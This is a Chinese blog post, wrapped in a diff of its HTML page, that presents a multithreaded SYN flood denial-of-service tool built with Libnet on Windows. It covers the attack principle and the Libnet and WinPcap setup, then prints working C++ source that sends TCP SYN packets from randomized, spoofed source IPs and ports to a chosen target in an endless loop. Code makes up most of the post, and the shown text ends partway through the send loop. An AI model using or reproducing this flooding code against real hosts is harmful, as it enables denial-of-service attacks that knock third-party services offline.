@@ -1,0 +1,618 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    
+    <title>基于 LibNET 的 SYN Flood 攻击 | Forec&#39;s Notes</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+        <meta name="keywords" content="OS,Safety,线程" />
+    
+    <meta name="description" content="使用 C++ 基于 Libnet 编写的 SYN 洪水拒绝服务攻击工具，支持多线程。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="基于 LibNET 的 SYN Flood 攻击">
+<meta property="og:url" content="http://forec.github.io/2016/11/20/ddos-syn-attack/index.html">
+<meta property="og:site_name" content="Forec's Notes">
+<meta property="og:description" content="使用 C++ 基于 Libnet 编写的 SYN 洪水拒绝服务攻击工具，支持多线程。">
+<meta property="og:image" content="http://7xktmz.com1.z0.glb.clouddn.com/ddos-syn-attack.jpg">
+<meta property="og:updated_time" content="2016-11-20T15:54:31.521Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="基于 LibNET 的 SYN Flood 攻击">
+<meta name="twitter:description" content="使用 C++ 基于 Libnet 编写的 SYN 洪水拒绝服务攻击工具，支持多线程。">
+    
+
+    
+        <link rel="alternate" href="/atom.xml" title="Forec&#39;s Notes" type="application/atom+xml" />
+    
+
+    
+        <link rel="icon" href="http://7xktmz.com1.z0.glb.clouddn.com/sitefavicon.png# path to favicon" />
+    
+
+    <link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css" type="text/css">
+    <link rel="stylesheet" href="/libs/titillium-web/styles.css" type="text/css">
+    <link rel="stylesheet" href="/libs/source-code-pro/styles.css" type="text/css">
+
+    <link rel="stylesheet" href="/css/style.css" type="text/css">
+
+    <script src="/libs/jquery/2.0.3/jquery.min.js" type="text/javascript"></script>
+    
+    
+        <link rel="stylesheet" href="/libs/lightgallery/css/lightgallery.min.css" type="text/css">
+    
+    
+    
+
+</head>
+
+<body>
+    <div id="wrap">
+        <header id="header">
+    <div id="header-outer" class="outer">
+        <div class="container">
+            <div class="container-inner">
+                <div id="header-title">
+                    <h1 class="logo-wrap">
+                        <a href="/" class="logo"></a>
+                    </h1>
+                    
+                </div>
+                <div id="header-inner" class="nav-container">
+                    <a id="main-nav-toggle" class="nav-icon fa fa-bars"></a>
+                    <div class="nav-container-inner">
+                        <ul id="main-nav">
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/">主页</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/about/index.html">关于我</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/columns/index.html">专栏</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="/projects/index.html">个人项目列表</a>
+                                </li>
+                            
+                                <li class="main-nav-list-item" >
+                                    <a class="main-nav-list-link" href="http://forec.cn">FOREC 的官方网站</a>
+                                </li>
+                            
+                        </ul>
+                        <nav id="sub-nav">
+                            <div id="search-form-wrap">
+
+    <form class="search-form">
+        <input type="text" class="ins-search-input search-form-input" placeholder="搜索" />
+        <button type="submit" class="search-form-submit"></button>
+    </form>
+    <div class="ins-search">
+    <div class="ins-search-mask"></div>
+    <div class="ins-search-container">
+        <div class="ins-input-wrapper">
+            <input type="text" class="ins-search-input" placeholder="想要查找什么..." />
+            <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+(function (window) {
+    var INSIGHT_CONFIG = {
+        TRANSLATION: {
+            POSTS: '文章',
+            PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
+            UNTITLED: '(未命名)',
+        },
+        ROOT_URL: '/',
+        CONTENT_URL: '/content.json',
+    };
+    window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+})(window);
+</script>
+<script src="/js/insight.js" type="text/javascript"></script>
+
+</div>
+                        </nav>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+        <div class="container">
+            <div class="main-body container-inner">
+                <div class="main-body-inner">
+                    <section id="main">
+                        <div class="main-body-header">
+    <h1 class="header">
+    
+    <a class="page-title-link" href="/categories/Code/">Code</a>
+    </h1>
+</div>
+                        <div class="main-body-content">
+                            <article id="post-ddos-syn-attack" class="article article-single article-type-post" itemscope itemprop="blogPost">
+    <div class="article-inner">
+        
+            <header class="article-header">
+                
+    
+        <h1 class="article-title" itemprop="name">
+        基于 LibNET 的 SYN Flood 攻击
+        </h1>
+    
+
+            </header>
+        
+        
+            <div class="article-subtitle">
+                <a href="/2016/11/20/ddos-syn-attack/" class="article-date">
+    <time datetime="2016-11-20T13:42:03.000Z" itemprop="datePublished">2016-11-20</time>
+</a>
+                
+    <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/OS/">OS</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Safety/">Safety</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/线程/">线程</a></li></ul>
+
+            </div>
+        
+        
+        <div class="article-entry" itemprop="articleBody">
+            <blockquote>
+<p>使用 C++ 基于 Libnet 编写的 SYN 洪水拒绝服务攻击工具，支持多线程。</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h1><ul>
+<li><a href="https://en.wikipedia.org/wiki/SYN_flood" target="_blank" rel="external">WIKIPEDIA：SYN flood</a></li>
+<li><a href="https://en.wikipedia.org/wiki/Denial-of-service_attack" target="_blank" rel="external">WIKIPEDIA: Denial of service attack</a></li>
+</ul>
+<p>以上两个链接分别是 SYN 洪水攻击和拒绝服务攻击的维基百科。基本原理就是在 TCP 建立连接的三次握手过程中，伪造其它 IP 地址，并向服务器发送 SYN，消耗服务器带宽和 CPU 资源。攻击效果取决于参与攻击的肉鸡数量、网络状况、受攻击方的防范能力。</p>
+<h1 id="Libnet-环境配置"><a href="#Libnet-环境配置" class="headerlink" title="Libnet 环境配置"></a>Libnet 环境配置</h1><p>工具基于 Libnet 编写，Windows下的环境配置较复杂，英文版配置说明可参考托管在 GitHub 上的 <a href="https://github.com/Forec/ddos-synflood" target="_blank" rel="external">README</a>。具体配置如下：</p>
+<ul>
+<li>从<a href="https://github.com/sam-github/libnet/tree/master/libnet" target="_blank" rel="external">这里</a>下载 LibNET 源代码，从<a href="http://www.winpcap.org/install/bin/WinPcap_4_1_3.exe" target="_blank" rel="external">这里</a>下载 WinPcap 的安装包。之后，从<a href="http://www.winpcap.org/install/bin/WpdPack_4_1_2.zip" target="_blank" rel="external">这里</a>下载 WpdPack 源代码。</li>
+<li>假设你将 LibNET 源代码包解压到 <code>E:\libnet-1.2-rc3</code>，将 WpdPack 包解压到 <code>E:\WpdPack</code>。<code>E:\libnet-1.2-rc3\libnet</code> 下有一个文件夹 <code>win32</code>。你需要使用该目录下的代码建立一个 VS 工程。</li>
+<li>配置这个工程：在 <code>E:\libnet-1.2-rc3\libnet</code> 和 <code>E:\WpdPack</code> 下均有一个名为 <code>include</code> 的文件夹，如果你解压的位置和我上一步教程中相同，则这两个文件夹的路径分别为 <code>E:\libnet-1.2-rc3\libnet\include</code> 和 <code>E:\WpdPack\include</code>。 将这两个路径添加到工程的 VC++ <code>Include</code> 目录。</li>
+<li>将 WpdPack 的 Lib 目录添加到工程的 VC++ <code>Lib</code> 目录，这里是 <code>E:\WpdPack\Lib</code>.</li>
+<li>编辑 <code>E:\libnet-1.2-rc3\libnet\win32</code> 下的 <code>in_systm.h</code>，在其末尾添加</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">char</span> <span class="keyword">int8_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">short</span> <span class="keyword">int16_t</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">int</span> <span class="keyword">int32_t</span>;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>现在你可以生成解决方案，如果生成成功，你将在 <code>E:\libnet-1.2-rc3\libnet\win32\Debug</code> 下生成 <code>Libnet.dll</code> 和 <code>Libnet.lib</code>。将它们复制到 <code>C:\Windows\System32</code> 和 <code>C:\Windows\SysWOW64</code>。至此，LibNET 环境配置完成。</li>
+</ul>
+<h1 id="工程环境配置"><a href="#工程环境配置" class="headerlink" title="工程环境配置"></a>工程环境配置</h1><ul>
+<li>新建一个 VS 工程，目前工程为空。你可以从我托管在 GitHub 上的 <a href="https://github.com/Forec/ddos-synflood" target="_blank" rel="external">仓库</a> 下载源代码：<code>SYNFlood.cpp</code> 和 <code>wingetopt.h</code>。</li>
+<li>设置工程：将 <code>E:\libnet-1.2-rc3\libnet\include</code>、<code>E:\libnet-1.2-rc3\libnet\src</code>、<code>E:\libnet-1.2-rc3\libnet\include\libnet</code>、<code>E:\WpdPack\Include</code>、<code>E:\WpdPack\Include\pcap</code> 添加到工程的 VC++ 目录。</li>
+<li>添加 <code>E:\WpdPack\Lib</code>、<code>E:\WpdPack\Lib\x64</code>、<code>E:\libnet-1.2-rc3\libnet\win32\Debug</code> 添加到工程的 VC++ 链接目录。</li>
+<li>在工程的链接器输入附加项中添加 <code>libnet.lib</code>。</li>
+<li>将 <code>E:\libnet-1.2-rc3\libnet\win32\Debug</code> 添加到链接器附加目录。</li>
+<li>生成可执行文件。</li>
+</ul>
+<h1 id="头文件和宏定义"><a href="#头文件和宏定义" class="headerlink" title="头文件和宏定义"></a>头文件和宏定义</h1><p>工程使用到的头文件、宏定义、全局变量和结构体定义如下，其中：</p>
+<ul>
+<li><code>wingetopt.h</code> 是为 Windows 平台编写的 POSIX 系统下的 <code>getopt.h</code></li>
+<li><code>libnet_timersub</code> 宏用于延时</li>
+<li><code>gettimeofday</code> 是模仿 POSIX 系统下的 <code>gettimeofday</code> 函数编写的 Windows 版本</li>
+<li><code>usage</code> 生成提示信息</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/utime.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;libnet.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">"wingetopt.h"</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;process.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;pcap.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">pragma</span> pack (<span class="number">1</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">pragma</span> comment(lib,<span class="string">"wpcap.lib"</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">pragma</span> comment(lib,<span class="string">"ws2_32.lib"</span>)</span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> PCAP_OPENFLAG_PROMISCUOUS <span class="number">1</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> errbuf[PCAP_ERRBUF_SIZE];</span><br><span class="line"><span class="keyword">char</span> name[<span class="number">1001</span>];</span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">define</span> libnet_timersub(tvp, uvp, vvp)                      \</span><br><span class="line">do &#123;                                                        \</span><br><span class="line">	(vvp)-&gt;tv_sec = (tvp)-&gt;tv_sec - (uvp)-&gt;tv_sec;          \</span><br><span class="line">    (vvp)-&gt;tv_usec = (tvp)-&gt;tv_usec - (uvp)-&gt;tv_usec;       \</span><br><span class="line">    <span class="keyword">if</span> ((vvp)-&gt;tv_usec &lt; <span class="number">0</span>) &#123;                               \</span><br><span class="line">        (vvp)-&gt;tv_sec--;                                    \</span><br><span class="line">        (vvp)-&gt;tv_usec += <span class="number">1000000</span>;                          \</span><br><span class="line">    &#125;                                                       \</span><br><span class="line">&#125; while (<span class="number">0</span>)</span></span><br><span class="line"></span><br><span class="line">u_long dst_ip   = <span class="number">0</span>;</span><br><span class="line">u_short dst_prt = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> speed = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> t_pack&#123;</span><br><span class="line">    <span class="keyword">struct</span> libnet_ipv4_hdr ip;</span><br><span class="line">    <span class="keyword">struct</span> libnet_tcp_hdr tcp;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gettimeofday</span><span class="params">(<span class="keyword">struct</span> timeval * tp, <span class="keyword">struct</span> timezone * tzp)</span></span>&#123;</span><br><span class="line">	<span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">uint64_t</span> EPOCH = ((<span class="keyword">uint64_t</span>)<span class="number">116444736000000000U</span>LL);</span><br><span class="line">	SYSTEMTIME  system_time;</span><br><span class="line">	FILETIME    file_time;</span><br><span class="line">	<span class="keyword">uint64_t</span>    time;</span><br><span class="line"></span><br><span class="line">	GetSystemTime(&amp;system_time);</span><br><span class="line">	SystemTimeToFileTime(&amp;system_time, &amp;file_time);</span><br><span class="line">	time = ((<span class="keyword">uint64_t</span>)file_time.dwLowDateTime);</span><br><span class="line">	time += ((<span class="keyword">uint64_t</span>)file_time.dwHighDateTime) &lt;&lt; <span class="number">32</span>;</span><br><span class="line"></span><br><span class="line">	tp-&gt;tv_sec = (<span class="keyword">long</span>)((time - EPOCH) / <span class="number">10000000L</span>);</span><br><span class="line">	tp-&gt;tv_usec = (<span class="keyword">long</span>)(system_time.wMilliseconds * <span class="number">1000</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usage</span><span class="params">(<span class="keyword">char</span> *nomenclature)</span></span>&#123;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,</span><br><span class="line">        <span class="string">"\nusage: %s -t [-s -p]\n"</span></span><br><span class="line">        <span class="string">"\t-t target (ip.address.port: 192.168.1.193.80)\n"</span></span><br><span class="line">        <span class="string">"\t-s number of packets to send per second (defaults to max speed)\n"</span></span><br><span class="line">        <span class="string">"\t-p number of threads to send packets (defaults to 1)\n"</span> , nomenclature);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="选择网卡"><a href="#选择网卡" class="headerlink" title="选择网卡"></a>选择网卡</h1><p>函数 <code>select_adapter</code> 用于选择发送 SYN 数据包的网卡，它将列出检测到的所有网卡并由用户输入选择。</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">select_adapter</span><span class="params">(pcap_t **handle)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">pcap_if_t</span> *alldevs;</span><br><span class="line">	<span class="keyword">pcap_if_t</span> *d;</span><br><span class="line">	<span class="keyword">int</span> inum, i=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(pcap_findalldevs(&amp;alldevs, errbuf) == -<span class="number">1</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Error in pcap_findalldevs: %s\n"</span>, errbuf);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span>(d = alldevs; d; d = d-&gt;next)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"%d. %s"</span>, ++i, d-&gt;name);</span><br><span class="line">		<span class="keyword">if</span> (d-&gt;description)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">" (%s)\n"</span>, d-&gt;description);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">" (No description available)\n"</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(!i)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\nNo interfaces found! Make sure WinPcap is installed.\n"</span>);</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Choose the interface (1-%d):"</span>,i);</span><br><span class="line">	scanf_s(<span class="string">"%d"</span>, &amp;inum);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(inum &lt; <span class="number">1</span> || inum &gt; i)&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"\nInterface number out of range.\n"</span>);</span><br><span class="line">		pcap_freealldevs(alldevs);</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="comment">/* Jump to the selected adapter */</span></span><br><span class="line">	<span class="keyword">for</span>(d = alldevs, i = <span class="number">0</span>; i &lt; inum-<span class="number">1</span> ; d = d-&gt;next, i++);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((*handle= pcap_open_live(</span><br><span class="line">		d-&gt;name,	<span class="comment">// name of the device</span></span><br><span class="line">		<span class="number">65536</span>,		<span class="comment">// portion of the packet to capture. </span></span><br><span class="line">					<span class="comment">// 65536 grants that the whole packet will be captured on all the MACs.</span></span><br><span class="line">		PCAP_OPENFLAG_PROMISCUOUS,				</span><br><span class="line">					<span class="comment">// promiscuous mode (nonzero means promiscuous)</span></span><br><span class="line">		<span class="number">1000</span>,		<span class="comment">// read timeout</span></span><br><span class="line">		errbuf		<span class="comment">// error buffer</span></span><br><span class="line">		)) == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"\nUnable to open the adapter. %s is not supported by WinPcap\n"</span>, d-&gt;name);</span><br><span class="line">		pcap_freealldevs(alldevs);</span><br><span class="line">		<span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	strcpy_s(name,d-&gt;name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"Successfully Open the adapter &lt;%s&gt; \n"</span>, d-&gt;description);</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="发送线程函数"><a href="#发送线程函数" class="headerlink" title="发送线程函数"></a>发送线程函数</h1><p>此函数用于构造并发送 SYN 数据包：</p>
+<ul>
+<li>根据用户指定参数生成的 speed 的不同，默认全速发送（speed = 0），否则根据 speed 的值在每次发送后延时</li>
+<li>构造的 SYN 包中，IP 包中的源 IP 和 TCP 包头中的源端口均为随机数</li>
+<li><code>libnet_write</code> 用于发送数据包</li>
+<li><code>l</code> 是 <code>libnet</code> 中的上下文</li>
+</ul>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> __<span class="function">stdcall <span class="title">send_syn</span><span class="params">(PVOID argv)</span></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> timeval r;</span><br><span class="line">	<span class="keyword">struct</span> timeval s;</span><br><span class="line">	<span class="keyword">struct</span> timeval e;</span><br><span class="line">	<span class="keyword">libnet_ptag_t</span> t = LIBNET_PTAG_INITIALIZER;</span><br><span class="line">	<span class="keyword">u_int32_t</span> src_ip;</span><br><span class="line">	<span class="keyword">char</span> errbuf[LIBNET_ERRBUF_SIZE];</span><br><span class="line">	u_short src_prt;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">libnet_t</span> *l = libnet_init(</span><br><span class="line">			LIBNET_RAW4,                     <span class="comment">/* injection type */</span></span><br><span class="line">			name,                            <span class="comment">/* network interface */</span></span><br><span class="line">			errbuf);                         <span class="comment">/* errbuf */</span></span><br><span class="line">	<span class="keyword">if</span> (l == <span class="literal">NULL</span>)&#123;</span><br><span class="line">		<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"libnet_init() failed: %s"</span>, errbuf);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    libnet_seed_prand(l);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(speed == <span class="number">0</span>)&#123;</span><br><span class="line">	    <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">            t = libnet_build_tcp(</span><br><span class="line">                    src_prt = libnet_get_prand(LIBNET_PRu16),</span><br><span class="line">                    dst_prt,</span><br><span class="line">                    libnet_get_prand(LIBNET_PRu32), <span class="comment">// sequence number</span></span><br><span class="line">                    <span class="number">0</span>,								<span class="comment">// acknowledgement num</span></span><br><span class="line">                    TH_SYN,</span><br><span class="line">                    libnet_get_prand(LIBNET_PRu16), <span class="comment">// window size</span></span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    LIBNET_TCP_H,</span><br><span class="line">                    <span class="literal">NULL</span>,</span><br><span class="line">                    <span class="number">0</span>,</span><br><span class="line">                    l,</span><br><span class="line">                    <span class="number">0</span>);</span><br><span class="line">            </span><br><span class="line">			libnet_build_ipv4(</span><br><span class="line">                LIBNET_TCP_H + LIBNET_IPV4_H,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                libnet_get_prand(LIBNET_PRu16),</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                libnet_get_prand(LIBNET_PR8),</span><br><span class="line">                IPPROTO_TCP,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">				src_ip = libnet_get_prand(LIBNET_PRu32), </span><br><span class="line">                dst_ip,</span><br><span class="line">                <span class="literal">NULL</span>,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                l,</span><br><span class="line">                <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">int</span> c = libnet_write(l);</span><br><span class="line">            <span class="keyword">if</span> (c == -<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"libnet_write: %s\n"</span>, libnet_geterror(l));</span><br><span class="line">            &#125;</span><br><span class="line">            libnet_clear_packet(l);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">			gettimeofday(&amp;s, <span class="literal">NULL</span>);</span><br><span class="line">			<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; speed; i++)&#123;</span><br><span class="line">				t = libnet_build_tcp(</span><br><span class="line">						src_prt = libnet_get_prand(LIBNET_PRu16),</span><br><span class="line">						dst_prt,</span><br><span class="line">						libnet_get_prand(LIBNET_PRu32), <span class="comment">// sequence number</span></span><br><span class="line">						<span class="number">0</span>,                              <span class="comment">// acknowledgement num</span></span><br><span class="line">						TH_SYN,</span><br><span class="line">						libnet_get_prand(LIBNET_PRu16), <span class="comment">// window size</span></span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						LIBNET_TCP_H,</span><br><span class="line">						<span class="literal">NULL</span>,</span><br><span class="line">						<span class="number">0</span>,</span><br><span class="line">						l,</span><br><span class="line">						t);</span><br><span class="line">				libnet_build_ipv4(</span><br><span class="line">					LIBNET_TCP_H + LIBNET_IPV4_H,</span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					libnet_get_prand(LIBNET_PRu16),</span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					libnet_get_prand(LIBNET_PR8),</span><br><span class="line">					IPPROTO_TCP,</span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					src_ip = libnet_get_prand(LIBNET_PRu32), </span><br><span class="line">					dst_ip,</span><br><span class="line">					<span class="literal">NULL</span>,</span><br><span class="line">					<span class="number">0</span>,</span><br><span class="line">					l,</span><br><span class="line">					<span class="number">0</span>);</span><br><span class="line">				<span class="keyword">int</span> c = libnet_write(l);</span><br><span class="line">				<span class="keyword">if</span> (c == -<span class="number">1</span>) &#123;</span><br><span class="line">					<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"libnet_write: %s\n"</span>, libnet_geterror(l));</span><br><span class="line">				&#125;</span><br><span class="line">				libnet_clear_packet(l);</span><br><span class="line">			&#125;</span><br><span class="line">			gettimeofday(&amp;e, <span class="literal">NULL</span>);</span><br><span 